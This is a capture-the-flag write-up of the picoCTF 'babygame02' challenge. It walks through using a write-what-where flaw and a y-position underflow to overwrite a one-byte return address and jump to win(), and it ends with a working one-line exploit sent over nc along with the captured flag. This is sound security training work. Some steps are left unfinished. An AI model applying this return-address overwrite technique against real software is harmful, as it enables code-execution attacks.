# babygame02 #
 
## Overview ##
 
200 points
 
Category: [Binary Exploitation](../)
 
Tags : `#writewhatwhere #bufferunderflow #returnaddress #outofbounds #integermath`
 
## Description ##
 
Break the game and get the flag.
Welcome to BabyGame 02! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you'll have to figure your way around the map. You can connect with it using `nc saturn.picoctf.net <port>`.
 
## Approach ##

Began by disassembling the `game` binary within [Ghidra](https://ghidra-sre.org) and analysing the output.

Also checked the binary security with [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) `checksec` :

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

This challenge is a variant of the [babygame01](../babygame01/babygame01.md) challenge, the flag win condition differs in that the `win()` function is not explicitly called in `babygame02`, hence a modification of the return address or similar means of execution is required.

The binary security indicates no stack canaries are in use, so we won't need to be careful of those.

Visualising the stack frame of `main()` from the disassembly to show placement and relative offsets of local variables and other elemts on the stack. I've augmented the variables with their purpose obtained from analysis of functions (`main()`, `init_player()` and `move_player()`) :

    (stack top - lower address)
      |                  |
      | player_y_pos     | -0xaa8
      | player_x_pos     | -0xaa4
      | map_buf          | -0xa9d
      | local_11         | -0x11
      | local_10         | -0x10              sub 0xaa0
      |------------------|
      | Saved $ECX       |
      | Saved $EBX       |
      | Previous $EBP    | <--- $EBP
      |------------------|
      | Return Address   |
      |                  |
 
`move_player(player_y_pos, input_ch, map_buf)` contains the same exploitable line of code that forming a write-what-where primative. We control the player X and Y position and hence the address to write to, aswell as the byte to write through the ability to change the `player_title`. As this is similar to [babygame01](../babygame01/babygame01.md), refer to my write up for further details.

    *map_buf[(player_y_pos * 0x5a) + player_x_pos)] = player_title

This time we must overwrite a return address on the stack with the addres of the `win()` function to dumps the flag instead of overwriting a local variable of `main()`.

The behaviour of `move_player()` is slightly different in babygame02, in that before moving the player it writes to the previous player position (before move), clearing it with '.' (0x2e) character before updating and writing the new player position. This means cycling this exploit to write multiple bytes is not possible as it corrupts the previous byte written with the clear. Therefore we need to find a location where only one write operation is required to divert the flow of execution to the `win()` function address.

Function addresses from disassembly :

    `win()` address   = 0x08049770
    `main()` address  = 0x0804971d

The address for `win()` is after the stack management code at which what looks like a "NOP slide" can be seen, so anywhere in that series of `NOP`s was a good enough target.

The address for `main()` above is the instruction immeditely afder the `CALL move_player()` (i.e. the return address from `move_player()`).





How about the return address from `move_player()`, this is only one byte difference between the return address to main after the call to `move_player()` and the `win()` function.

..... addresses


`move_player()` stack frame :

    |                        |
    | old EBP                | <--- $ebp
    |------------------------|
    | return address         |
    |------------------------|
    | param1 - &player_y_pos |
    | param2 - input ch      |
    | param3 - map_buf       |
    |------------------------|
    |                        |

Stack offset from `map_buf` through to return address of `move_player()` stack frame were calculated via gdb.

    0xffffca7c  = Return Address
    0xffffca80  = add esp,10
    0xffffca90  = esp @ main()
    0xffffd538  = ebp
    0fffffcaa3  = ebp - 0xa95 (map_buf)
    --------------------------------------
    0xca - 0x7c = 39

Back calculating the required `player_x_pos` when `player_y_pos` causes a buffer underflow at `-1`.

    *map_buf[(player_y_pos * 0x5a) + player_x_pos)] = player_title

Where,

    (0xffffca7c - 0xffffcaa3) - (-1 * 0x5a) = 51 

 
## Solution ##
 
Plan of attack :

1. set the player_title character to the last byte of `win()` return address, using the `l` command
2. 



  - 
  - move player into position on the x-axis from starting position of 4
  - move player into position in the y-axis from starting positio of 4, underflowing to y_pos = -1

Final exploit :

    echo -e $(python3 -c 'print("lp" + "d"*(51-4) + "w"*5)') | ./game
    
    echo -e $(python3 -c 'print("lp" + "d"*(51-4) + "w"*5)') | nc saturn.picoctf.net 52597
    => picoCTF{gamer_jump1ng_4r0unD_498dff8d}

Had to run a few times on the remote server to work, likely due to the process exiting before fully flushing stdout via nc?